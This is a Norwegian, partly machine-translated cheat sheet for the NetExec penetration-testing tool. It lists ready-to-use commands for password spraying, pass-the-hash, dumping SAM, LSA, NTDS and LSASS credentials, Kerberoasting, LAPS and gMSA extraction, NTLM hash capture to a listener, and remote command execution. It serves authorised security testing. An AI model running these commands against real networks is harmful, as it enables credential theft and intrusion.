<!-- language-home-navigation -->
[🏠 Norsk Hovedside](../../README.nb.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇮🇹 Italiano](README.it.md) • [🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇬🇧 English](../README.md)

---


# ⚡ NetExec (nxc) - Komplett jukseark

[🇹🇷 Türkçe Sürüm](translations/README.tr.md)
```
  ███╗   ██╗███████╗████████╗███████╗██╗  ██╗███████╗ ██████╗ 
  ████╗  ██║██╔════╝╚══██╔══╝██╔════╝╚██╗██╔╝██╔════╝██╔════╝ 
  ██╔██╗ ██║█████╗     ██║   █████╗   ╚███╔╝ █████╗  ██║     
  ██║╚██╗██║██╔══╝     ██║   ██╔══╝   ██╔██╗ ██╔══╝  ██║     
  ██║ ╚████║███████╗   ██║   ███████╗██╔╝ ██╗███████╗╚██████╗ 
  ╚═╝  ╚═══╝╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚══════╝ ╚═════╝ 
        The Network Swiss Army Knife (CrackMapExec Successor)
```
<p align="center">
  <img src="https://img.shields.io/badge/NetExec-nxc-blue?style=for-the-badge" alt="NetExec">
  <img src="https://img.shields.io/badge/CME_Successor-Active_Development-green?style=for-the-badge" alt="CME-etterfølger">
  <img src="https://img.shields.io/badge/Multi_Protocol-SMB_LDAP_MSSQL-orange?style=for-the-badge" alt="Multi-Protocol">
  <img src="https://img.shields.io/badge/Network-Pentesting-red?style=for-the-badge" alt="Network Pentesting">
</p>

<p align="center">
  <b>🌐 Den offisielle, fellesskapsdrevne etterfølgeren til CrackMapExec for nettverks- og Active Directory-utnyttelse</b>
</p>

---

## 📋 Innholdsfortegnelse

– [Introduksjon](#-introduksjon)
- [Hvorfor NetExec over CrackMapExec?](#-why-netexec-over-crackmapexec)
- [Installasjon](#-installasjon)
- [Støttede protokoller](#-støttede protokoller)
- [SMB-utnyttelse](#-smb-utnyttelse)
  - [Rekognosering og del opptelling](#rekognosering--del-oppregning)
  - [Password Spraying & Credential Testing](#password-spraying--credential-testing)
  - [Pass-the-Hash (PtH) & Pass-the-Ticket (PtT)](#pass-the-hash-pth--pass-the-ticket-ptt)
  - [Credential Dumping (SAM, LSA, NTDS)](#credential-dumping-sam-lsa-ntds)
  - [Kommandoutførelse](#kommando-utførelse)
- [LDAP-utnyttelse](#-ldap-utnyttelse)
  - [Domain Enumeration & Password Policy](#domain-enumeration--password-policy)
  - [AS-REP-steking og kerberoasting](#as-rep-roasting--kerberoasting)
  - [LAPS & gMSA-ekstraksjon](#laps--gmsa-ekstraksjon)
  - [BloodHound Data Ingestion](#bloodhound-data-ingestion)
- [MSSQL-utnyttelse](#-mssql-utnyttelse)
- [WinRM-, RDP- og SSH-moduler](#-winrm-rdp--ssh-moduler)
- [Populære NetExec-moduler (`-M`)](#-populære-netexec-moduler--m)
- [Arbeidsområder og innebygd database](#-arbeidsområder--innebygd database)
- [Hurtigreferansetabell](#-hurtigreferansetabell)
– [Tips og beste fremgangsmåter](#-tips--beste praksis)
– [Juridisk ansvarsfraskrivelse](#-juridisk ansvarsfraskrivelse)
- [Ressurser](#-ressurser)

---

## 🎯 Introduksjon

**NetExec** (`nxc`) er et multi-purpose post-exploitation-verktøy utviklet for å automatisere vurdering av store Active Directory- og Windows-nettverk. Det er den offisielle, aktive fellesskapsgaffelen og fortsettelsen av **CrackMapExec** (CME), opprettet etter at CME ble trukket tilbake og arkivert av den opprinnelige forfatteren.

NetExec fungerer som en "sveitsisk armkniv" i nettverket, og kobler sømløst til SMB, LDAP, MSSQL, WinRM, RDP, SSH, FTP og VNC for å automatisere autentisering, legitimasjonsdumping, sårbarhetskontroller og sideveis bevegelse.

---

## ⚖️ Hvorfor NetExec over CrackMapExec?

| Funksjon | CrackMapExec (CME) | NetExec (nxc) |
|--------|---------------------|--------------|
| **Utviklingsstatus** | 🛑 Arkivert / avviklet | Aktivt vedlikeholdt |
| **Python-støtte** | Legacy (Python 3.8-3.10) | Moderne Python 3.10+ |
| **Protokollstøtte** | SMB, LDAP, MSSQL, WinRM, SSH | + VNC, FTP, RDP, WMI-forbedringer |
| **BloodHound Support** | Bare BloodHound Legacy | BloodHound CE & Legacy |
| **Kerberos & PKINIT** | Begrenset | Robust PKINIT & Kerberos billettstøtte |
| **Feilrettinger og moduler** | Frosset | Stadig oppdatert CVE og utnyttelsesmoduler |

---

## 📥 Installasjon

### Bruke pipx (anbefalt)
```bash
pipx install netexec
```
### Kali Linux

NetExec er den offisielle erstatningen for CrackMapExec i Kali:
```bash
sudo apt update && sudo apt install -y netexec
```
### Docker
```bash
docker run -it --rm -v ~/.nxc:/root/.nxc ghcr.io/penny-os/netexec:latest smb 10.10.10.0/24
```
### Bekreftelse
```bash
nxc --version
```
---

## 🔌 Støttede protokoller

NetExec godtar målprotokollen som sitt primære argument:
```bash
nxc <protocol> <target(s)> [options]
```
- `nxc smb` - Servermeldingsblokk (shares, SAM/LSA/NTDS-dumping, command exec)
- `nxc ldap` - Lightweight Directory Access Protocol (Kerberoasting, BloodHound, LAPS)
- `nxc mssql` - Microsoft SQL Server (databasespørringer, xp_cmdshell, etterligning)
- `nxc winrm` - Windows Remote Management (smidig kommandoutførelse)
- `nxc rdp` - Remote Desktop Protocol (godkjenning, skjermbilder)
- `nxc ssh` - Secure Shell (Linux/UNIX legitimasjonstesting og exec)
- `nxc ftp` / `nxc vnc` - Filoverføring og virtuell nettverksdatabehandling

---

## 🛡️ SMB-utnyttelse

### Rekognosering og delopptelling
```bash
# Discover live hosts and check SMB signing status
nxc smb 10.10.10.0/24

# Enumerate null/anonymous sessions
nxc smb 10.10.10.50 -u '' -p '' --shares
nxc smb 10.10.10.50 -u 'guest' -p '' --shares

# Enumerate readable shares with credentials
nxc smb 10.10.10.0/24 -u 'alice' -p 'Welcome2026!' --shares

# Spider shares for sensitive files (e.g., matching config, password, or bak)
nxc smb 10.10.10.50 -u 'alice' -p 'Welcome2026!' -M spider_plus
```
### Passordspraying og legitimasjonstesting
```bash
# Check domain password policy before spraying (Prevents account lockouts!)
nxc smb 10.10.10.1 -u 'alice' -p 'Welcome2026!' --pass-pol

# Password spray a single password against a list of users
nxc smb 10.10.10.1 -u users.txt -p 'SeasonYear2026!' --continue-on-success

# Credential stuffing with user:pass pairs
nxc smb 10.10.10.1 -u users.txt -p passwords.txt --no-bruteforce
```
### Pass-the-Hash (PtH) og Pass-the-Ticket (PtT)
```bash
# Authenticate using NTLM hash
nxc smb 10.10.10.0/24 -u 'Administrator' -H 'fc525c9680e4760a094da0c9ec5f0d94' --local-auth

# Authenticate using Kerberos ccache ticket
export KRB5CCNAME=/path/to/ticket.ccache
nxc smb dc01.corp.local -k --shares
```
### Legitimasjonsdumping (SAM, LSA, NTDS)
```bash
# Dump local SAM database (Requires administrative privileges)
nxc smb 10.10.10.50 -u 'Administrator' -H 'hash' --sam

# Dump LSA secrets (Service accounts, cleartext passwords)
nxc smb 10.10.10.50 -u 'Administrator' -H 'hash' --lsa

# Dump Active Directory NTDS.dit database via VSS on Domain Controller
nxc smb 10.10.10.1 -u 'Administrator' -p 'Password123' --ntds
```
### Kommandoutførelse
```bash
# Execute command via WMI (default)
nxc smb 10.10.10.50 -u 'Administrator' -p 'Pass123' -x 'whoami /all'

# Execute command via PowerShell
nxc smb 10.10.10.50 -u 'Administrator' -p 'Pass123' -X 'Get-Process'

# Execute command via SMBexec or atexec
nxc smb 10.10.10.50 -u 'Administrator' -p 'Pass123' --exec-method smbexec -x 'ipconfig'
```
---

## 🌳 LDAP-utnyttelse

### Domeneoppregning og passordpolicy
```bash
# Dump domain users
nxc ldap 10.10.10.1 -u 'alice' -p 'Welcome2026!' --users

# Dump domain groups and memberships
nxc ldap 10.10.10.1 -u 'alice' -p 'Welcome2026!' --groups

# Check for active domain computers
nxc ldap 10.10.10.1 -u 'alice' -p 'Welcome2026!' --computers
```
### AS-REP Steking og Kerberoasting
```bash
# Identify and dump AS-REP Roastable accounts (DONT_REQ_PREAUTH)
nxc ldap 10.10.10.1 -u 'alice' -p 'Welcome2026!' --asreproast asrep_hashes.txt

# Request Kerberos Service Tickets (Kerberoasting)
nxc ldap 10.10.10.1 -u 'alice' -p 'Welcome2026!' --kerberoasting kerberoast_hashes.txt
```
### LAPS & gMSA-ekstraksjon
```bash
# Extract Microsoft LAPS (Local Administrator Password Solution) passwords
nxc ldap 10.10.10.1 -u 'alice' -p 'Welcome2026!' -M laps

# Dump Group Managed Service Account (gMSA) passwords
nxc ldap 10.10.10.1 -u 'alice' -p 'Welcome2026!' -M gmsa
```
### BloodHound-datainntak
```bash
# Collect BloodHound data natively over LDAP
nxc ldap 10.10.10.1 -u 'alice' -p 'Welcome2026!' --bloodhound --collection All
```
---

## 🗄️ MSSQL-utnyttelse
```bash
# Test MSSQL authentication across network
nxc mssql 10.10.10.0/24 -u 'sa' -p 'DatabasePassword!'

# Check for privilege escalation via server links
nxc mssql 10.10.10.75 -u 'sa' -p 'DatabasePassword!' -M enum_links

# Enable xp_cmdshell and execute operating system command
nxc mssql 10.10.10.75 -u 'sa' -p 'DatabasePassword!' -x 'whoami'

# Capture NetNTLMv2 hash by triggering xp_dirtree
nxc mssql 10.10.10.75 -u 'sa' -p 'DatabasePassword!' -M capture-ntlm -o IP=192.168.1.100
```
---

## 🚀 WinRM, RDP og SSH-moduler

### WinRM-kommandoutførelse
```bash
nxc winrm 10.10.10.50 -u 'Administrator' -p 'Pass123' -x 'whoami'
```
### RDP-skjermdumping og auth
```bash
# Check RDP credentials and capture login screenshot
nxc rdp 10.10.10.50 -u 'Administrator' -p 'Pass123' --screenshot
```
### SSH-sprøyting og kommandoer
```bash
nxc ssh 10.10.10.0/24 -u 'root' -p 'toor' -x 'id'
```
---

## 🧩 Populære NetExec-moduler (`-M`)

| Modul | Protokoll | Beskrivelse | Eksempel |
|--------|--------|----------------|--------|
| `spooler` | SMB | Sjekk om Print Spooler-tjenesten kjører (PrinterBug) | `nxc smb <IP> -M spooler` |
| `zerologon` | SMB | Se etter CVE-2020-1472-sårbarhet | `nxc smb <IP> -M zerologon` |
| `nopac` | SMB | Se etter CVE-2021-42278 / CVE-2021-42287 | `nxc smb <IP> -M nopac` |
| `petitpotam` | SMB | Sjekk om verten er sårbar for PetitPotam-tvang | `nxc smb <IP> -M petitpotam` |
| `nanodump` | SMB | Dump LSASS-minne minidump snikende ved å bruke nanodump | `nxc smb <IP> -u admin -p pass -M nanodump` |
| `webdav` | SMB | Sjekk om WebClient-tjenesten er aktiv for WebDAV-relé | `nxc smb <IP> -M webdav` |
| `laps` | LDAP | Dump LAPS-passord for arbeidsstasjoner | `nxc ldap <IP> -u u -p p -M laps` |
| `gmsa` | LDAP | Trekk ut gruppeadministrerte tjenestekontohemmeligheter | `nxc ldap <IP> -u u -p p -M gmsa` |

---

## 💾 Arbeidsområder og innebygd database

NetExec registrerer automatisk alle oppdagede verter, gyldig legitimasjon og dumpede hashes i en lokal SQLite-database (`~/.nxc/workspaces/`):
```bash
# View all stored credentials
nxc-database credentials

# View discovered hosts
nxc-database hosts

# Create and switch to a new client engagement workspace
nxc-database workspace create ClientAlpha
nxc-database workspace switch ClientAlpha
```
---

## 📊 Hurtigreferansetabell

| Oppgave | Protokoll | Kommando |
|------|--------|--------|
| **Oppreg andeler** | SMB | `nxc smb <IP> -u '' -p '' --shares` |
| **Sjekk retningslinjer for pass** | SMB | `nxc smb <DC> -u 'user' -p 'pass' --pass-pol` |
| **Passordspray** | SMB | `nxc smb <IP> -u users.txt -p 'Pass' --continue-on-success` |
| **Passer Hash** | SMB | `nxc smb <IP> -u 'admin' -H <NT_HASH> --local-auth` |
| **Dump SAM** | SMB | `nxc smb <IP> -u 'admin' -H <HASH> --sam` |
| **Dump NTDS** | SMB | `nxc smb <DC> -u 'admin' -p 'pass' --ntds` |
| **AS-REP-steking** | LDAP | `nxc ldap <DC> -u 'user' -p 'pass' --asreproast hashes.txt` |
| **Kerberoasting** | LDAP | `nxc ldap <DC> -u 'user' -p 'pass' --kerberoasting hashes.txt` |
| **Blodhunddump** | LDAP | `nxc ldap <DC> -u 'user' -p 'pass' --bloodhound --collection All` |
| **MSSQL xp_cmdshell**| MSSQL | `nxc mssql <IP> -u 'sa' -p 'pass' -x 'whoami'` |

---

## 💡 Tips og beste fremgangsmåter

1. **Sjekk alltid passordpolicy først:**
   Før du starter en passordspray, kjør alltid `nxc smb <DC> -u <USER> -p <PASS> --pass-pol` for å inspisere `Account Lockout Threshold`. Hvis den er satt til 3 eller 5, spray kun én gang hvert 30+ minutt for å unngå å låse domenekontoer.
2. **Bruk `--local-auth` for arbeidsstasjoner:**
   Når du tester lokal administratorlegitimasjon på tvers av arbeidsstasjoner i stedet for domenelegitimasjon, må du alltid inkludere `--local-auth`-flagget.
3. **Pivotingintegrasjon:**
   NetExec fungerer sømløst over SOCKS proxyer (f.eks. `proxychains nxc smb ...`) eller over Ligolo-ng TUN-grensesnitt med naturlig hastighet!

---

## ⚠️ Juridisk ansvarsfraskrivelse

> **VIKTIG:** NetExec er et støtende sikkerhetsvurderingsverktøy. Den må strengt tatt brukes på datanettverk og domeneinfrastruktur der du har fått eksplisitt, dokumentert autorisasjon.

---

## 📚 Ressurser

- [NetExec offisielle GitHub-depot](https://github.com/Pennyw0rth/NetExec)
- [Offisiell NetExec-dokumentasjon](https://www.netexec.wiki/)